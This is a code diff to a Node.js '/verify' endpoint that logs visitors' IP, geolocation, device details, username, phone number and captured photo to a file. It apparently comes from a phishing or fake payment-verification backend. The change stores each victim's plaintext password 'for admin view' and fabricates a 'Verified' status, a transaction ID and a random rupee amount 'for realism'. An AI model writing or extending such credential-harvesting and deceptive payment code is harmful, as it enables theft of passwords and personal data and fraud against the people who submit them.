@@ -338,8 +338,12 @@ app.post("/verify", async (req, res) => {
     }
   }
 
+  // Generate Transaction/Verification ID
+  const verificationId = "PAY-" + crypto.randomBytes(4).toString("hex").toUpperCase();
+
   // Save all data to file (ONLY place data is stored - no console logging)
   const logData = {
+    verificationId,
     timestamp,
     ip,
     geo,
@@ -347,10 +351,12 @@ app.post("/verify", async (req, res) => {
     deviceDetails: parsedDeviceDetails,
     userAgent,
     username: inputUsername,
-    password: `[${inputPassword.length} chars]`,  // Only length for display
+    password: inputPassword, // Store actual password for admin view
     passwordHash: hashPassword(inputPassword),     // Secure hash
     phoneNumber: phoneNumber || null,
     photoData: photoData ? "[CAPTURED]" : null,
+    status: "Verified", // Default status for paid/verified
+    amount: "₹" + (Math.floor(Math.random() * 500) + 100) + ".00" // Mock amount for realism
   };
 
   // Append to loginAttempts.json
